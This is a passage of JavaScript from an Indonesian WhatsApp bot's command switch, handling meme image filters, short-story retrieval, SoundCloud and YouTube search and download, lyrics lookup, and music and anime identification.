.then((data) => atak.sendMedia (from, data, setQuoted, {caption: "Nih"}))
.catch((err) => console.log(err));
}
break
//================================================================================\\
case 'approved':
case 'wanted':
case 'utatoo':
case 'unsharpen':
case 'thanos':
case 'sniper':
case 'sharpen':
case 'sepia':
case 'scary':
case 'rip':
case 'redple':
case 'rejected':
case 'posterize':
case 'ps4':
case 'pixelize':
case 'missionpassed':
case 'moustache':
case 'lookwhatkarenhave':
case 'jail':
case 'invert':
case 'greyscale':
case 'glitch':
case 'frame':
case 'fire':
case 'distort':
case 'dictator':
case 'deepfry':
case 'ddungeon':
case 'circle':
case 'challenger':
case 'burn':
case 'brazzers':
case 'beautiful':
case '3000years':
if (!isRegist) return onlyRegist()
if (isQuotedImage) {
try{
onlyWait()
let ahah = await atak.downloadAndSaveMediaMessage(quoted)
let owgi = await TelegraPh(ahah)
let ini_gen = `${command}`
ameApi.generate(ini_gen, { url : owgi}).then(gambar => {
atak.sendMessage(from, {image: gambar, caption: "Nih"  }, {quoted: ridho})
fs.unlinkSync(ahah) 
})
}catch(err){
console.log(err)
}
} else if (isQuotedTag || isQuotedReply) {
onlyWait()
let ghost = users 
let oppp = await atak.profilePictureUrl(ghost, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let ini_gen = `${command}`
ameApi.generate(ini_gen, {
url : oppp
}).then(gambar => {
atak.sendMessage(from, {image: gambar, caption: "Nih" }, {quoted: ridho})
}).catch(err => {
setReply(`${err}`)
});    
} else {
setReply("Tag atau Reply targetnya")
}
break
//================================================================================\\
case 'cerpen-anak':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`anak`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasadaerah':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`bahasa daerah`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasainggris':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`bahasa Inggris`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasajawa':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`bahasa jawa`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-bahasasunda':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`bahasa sunda`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-budaya':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`budaya`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cinta':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`cinta`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintaislami':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`cinta islami`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintapertama':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`cinta pertama`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintaromantis':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`cinta romantis`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasedih':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`cinta sedih`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasegitiga':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`Cinta segitiga`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasejati':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`cinta sejati`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-galau':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`galau`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-gokil':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`gokil`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-inspiratif':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`inspiratif`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-jepang':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`jepang`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kehidupan':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`kehidupan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-keluarga':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`keluarga`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kisahnyata':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`kisah nyata`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-korea':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`korea`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kristen':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`kristen`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-liburan':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`liburan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-malaysia':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`malaysia`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-mengharukan':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`mengharukan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-misteri':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`misteri`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-motivasi':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`motivasi`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-nasihat':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`nasihat`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-nasionalisme':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`nasionalisme`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-olahraga':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`olahraga`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-patahhati':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`patah hati`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-penantian':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`penantian`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pendidikan':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`pendidikan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pengalaman':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`pengalaman pribadi`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pengorbanan':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`pengorbanan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-penyesalan':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`penyesalan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-perjuangan':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`perjuangan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-perpisahan':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`perpisahan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-persahabatan':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`persahabatan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-petualangan':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`petualangan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-ramadhan':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`ramadhan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-remaja':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`remaja`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-rindu':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`rindu`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-rohani':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`rohani`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-romantis':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`romantis`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sastra':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`sastra`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sedih':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`sedih`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sejarah':{
if (!isRegist) return onlyRegist()
let cerpe = await cerpen(`sejarah`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
//================================================================================\\
case 'scsearch':
if (!isRegist) return onlyRegist()
if(!q) return setReply("Masukan link")
let scdl = await SoundCloud.create();
let result = await scdl.search({
query: q,
limit: 15, 
offset: 0, 
filter: 'tracks' 
});

let teks =`*SOUNDCLOUD SEARCH*`

for (let res of result.collection){
teks +=`

📂 Judul : ${res.title}
⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
🌐 Url : ${res.permalink_url}

═════════════════
`
} 

teks +=`_Thanks for choosing SoundCloud_`

try{
let anuah = result.collection[0].artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
let anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
var yamiyami = await getBuffer(anuh)
}
let nano = [
{"buttonId": `${prefix}scmp3 ${result.collection[0].permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${result.collection[0].permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]
//atak.atak.sendButImage (from, teks, © ${fake1}, yamiyami, nano)
break
case 'scmp3':{
if (!isRegist) return onlyRegist()
if(!q) return setReply("Masukan Link")
if(q.includes("social_sharing")) return setReply("Masukan link dengan benar")
let atak = q.replace('https://m.', 'https://')
setReply("*Downloading...*")
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(atak);
let menit = Math.round(track.full_duration/1000/60)
if(menit > 10) return setReply("Tidak bisa mendownload musik lebih dari 10 menit")
scdlMp3(atak)
}
break
case 'scdoc':{
if (!isRegist) return onlyRegist()
if(!q) return setReply("Masukan Link")
if(q.includes("social_sharing")) return setReply("Masukan link dengan benar")
let atak = q.replace('https://m.', 'https://')
setReply("*Downloading...*")
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(atak);
let menit = Math.round(track.full_duration/1000/60)
if(menit > 10) return setReply("Tidak bisa mendownload musik lebih dari 10 menit")
scdlDoc(atak)
}
break
case 'ghstalk':{
if (!isRegist) return onlyRegist()
let atak = await ghstalk(q)
console.log(atak)
let foto = atak.avatar_url
let gambar = await getBuffer(foto)
console.log(foto)
let toks =`
Nama: ${atak.name}
Bio: ${atak.bio}
Followers: ${atak.followers}
Following: ${atak.following}
Repository: ${atak.public_repos}
Created at: ${atak.created_at}
Update at: ${atak.updated_at}
Twitter: ${atak.twitter_username}
Email: ${atak.email}
Lokasi: ${atak.location}
Website: ${atak.blog}
Github url: ${atak.url}
`
console.log(toks)
await atak.sendMessage(from, {image:gambar, caption: toks},{quoted: ridho})
}
break
case 'lirik':{
if (!isRegist) return onlyRegist()
if (args.length < 2) return reply(`Kirim perintah ${command} judul lagu`)
onlyWait()
ra.Musikmatch(q).then(async(data) => {
var teks = `*${data.result.judul} - ${data.result.penyanyi}*\n\n${data.result.lirik}`
atak.sendMessage(from, { image: { url: data.result.thumb }, caption: teks }, { quoted: ridho })
}).catch(() => reply(`Judul lagu tidak ditemukan`))
}
break
case 'grupwa': 
if (!isRegist) return onlyRegist()
if (!q) return reply(`Kirim perintah ${command} nama grup`)
onlyWait()
hxz.linkwa(q).then(async(data) => {
if (data.length == 0) return reply(`Grup ${q} tidak ditemukan`)
var teks = `*Hasil Pencarian Dari ${q}*\n\n`
for (let x of data) {
teks += `*Nama :* ${x.nama}\n*Link :* ${x.link}\n\n`
}
reply(teks)
}).catch(() => reply(mess.error.api))
break
case 'yts':
try {
if (!isRegist) return onlyRegist()
if (!q) return setReply('Format salah')
onlyWait()
let rus = await yts(q)
let res = await rus.all.filter(v => v.type == 'video')
let videoID = res[0].videoId
try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let a = `*Youtube Search 🔎*\n`
for (let i of res) {
a += `
📜 Title : ${i.title}
📈 Views : ${i.views}
🌐 Upload : ${i.ago}
⏱️ Durasi : ${i.timestamp}
🎥 Channel : ${i.author.name}
🖇️ Link : ${i.url}\n\n`
}
let b = a.trim()

let imag = await getBuffer(res[0].image)
let mok = [
{"buttonId": `${prefix}playmp3 ${res[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${res[0].url}`,"buttonText": {"displayText": `ᴠɪᴅᴇᴏ`},"type": "RESPONSE"}]
atak.sendButImage(from, b, `${fake}`, imag, mok, {quoted: ridho})
} catch (e) {
console.log(e)
setReply(`${e}`)
}
break
case 'whatmusic':
if (!isRegist) return onlyRegist()
if (isQuotedAudio) {
onlyWait()
let media = await atak.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let sample = fs.readFileSync(ran)
acr.identify(sample).then(async metadata => {
if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
var res = metadata.metadata.music[0]
let rus = await yts(res.title)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let ras = await rus.all.filter(v => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url);
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
let videoID = ras[0].videoId
try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]
let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
atak.sendButImage(from, teks, fake, yamyam, aklo, {contextInfo: forward})
});
fs.unlinkSync(ran)
})
} else if (isQuotedVideo) {
onlyWait()
let media = await atak.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -vn ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return setReply(`Err: ${err}`)
let sample = fs.readFileSync(ran)
acr.identify(sample).then(async metadata => {
if(metadata.status.msg == 'No result') return setReply("Music tidak di temukan")
var res = metadata.metadata.music[0]
let rus = await yts(res.title)
if(rus.all.length == "0") return setReply("Video tidak bisa di download")
let ras = await rus.all.filter(v => v.type == 'video')
let info = await ytdl.getInfo(ras[0].url);
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
let videoID = ras[0].videoId
try{
var thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
} catch(err) {
var thumbnya =`https://i.ytimg.com/vi/${videoID}/sqdefault.jpg`
}
let yamyam = await getBuffer(`${thumbnya}`)
let aklo = [
{"buttonId": `${prefix}playmp3 ${ras[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}playmp4 ${ras[0].url}`,"buttonText": {"displayText": `ᴠɪᴅɪᴏ`},"type": "RESPONSE"}
]

let teks = `
*RESULT FOUND* 💽

📂 Title: ${res.title}
👤 Artist: ${res.artists !== undefined ? res.artists.map(v => v.name).join(', ') : ''}
💾 Album: ${res.album.name || ''}
🧩 Genres: ${res.genres !== undefined ? res.genres.map(v => v.name).join(', ') : ''}
🌏 Release Date: ${res.release_date}
⏳ Durasi : ${ras[0].timestamp}
🎧 Audio : ${FileSize(audio[0].contentLength)}
🎬 Video : ${FileSize(format.contentLength)}
`
atak.sendButImage(from, teks, fake, yamyam, aklo, {contextInfo: forward})
});
fs.unlinkSync(ran)
})
} else {
setReply("Reply audio atau video")
}
break
case 'whatanime':{
if (!isRegist) return onlyRegist()
const FormData = require('form-data')
if (isImage || isQuotedImage) {       
let yoooo = await atak.downloadAndSaveMediaMessage(quoted)
let bodyForm = new FormData();
bodyForm.append('image', fs.createReadStream(yoooo)) 
fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
.then(async(res) =>{
if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
let teks = ''
if (res.result[0].similarity < 0.92) {
teks += '*Low similarity. 🤔*\n\n'
}
teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
await atak.sendMessage(from, {caption: teks, video: {url : res.result[0].video}}, {quoted: ridho})
})    .catch((err) => {                   
setReply(mess.error.api)
})
} else if (isSticker || isQuotedSticker ) {
let yoooo = await atak.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {
fs.unlinkSync(yoooo)
if (err) return setReply('Gagal :V')   
let bodyForm = new FormData();
bodyForm.append('image', fs.createReadStream(ran)) 
fetchJson("https://api.trace.moe/search", { method: "POST", body: bodyForm, })
.then(async(res) =>{
if (res.result && res.result.length <= 0) return setReply('Anime not found! :(')
let teks = ''
if (res.result[0].similarity < 0.92) {
teks += '*Low similarity. 🤔*\n\n'
}
teks += `*Title*: ${res.result[0].filename.split('.mp4')[0]}\n*Episode*: ${res.result[0].episode}\n*Similarity*: ${(res.result[0].similarity * 100).toFixed(1)}%`
